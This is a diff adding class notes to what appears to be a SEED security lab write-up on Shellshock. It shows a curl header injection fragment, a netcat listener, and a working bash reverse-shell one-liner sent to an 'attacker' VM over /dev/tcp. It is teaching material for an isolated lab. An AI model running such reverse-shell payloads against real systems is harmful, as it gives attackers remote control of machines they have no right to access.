@@ -144,3 +144,31 @@ curl -A "() { echo hello; };
 nc -lv 9090
 id
 ```
+
+##### From class:
+
+Follow instructions in Appendices in the SEED setup manual (lab00) to see how to clone your existing SEED VM and properly configure the NAT Network.
+
+Step 1: 
+```bash
+# start netcat server on "attacker" machine
+seed@VM(10.0.2.15):~$ nc -lv 9090
+Listening on [0.0.0.0] (family 0, port 9090)
+```
+
+Step 2: 
+```bash
+# experiment with ideal payload on "victim" machine (i.e., a remote server)
+seed@VM(10.0.2.7):~$ /bin/bash -i > /dev/tcp/10.0.2.15/9090 0<&1 2>&1
+```
+
+At this point, you have a reverse shell setup! 
+You can now specify commands from the "attacker" VM, 
+which are sent over the network connection and run on the victim's machine; 
+the results are also sent back over the network connection to the "attacker" VM. 
+In this way, you have shell access to the victim VM! 
+
+The question then is: how do you get the victim to execute your payload?!
+
+**NOTE:** The IP addresses are specific to my configuration. 
+You should use `ifconfig` to verify the IP addresses on your VMs. 
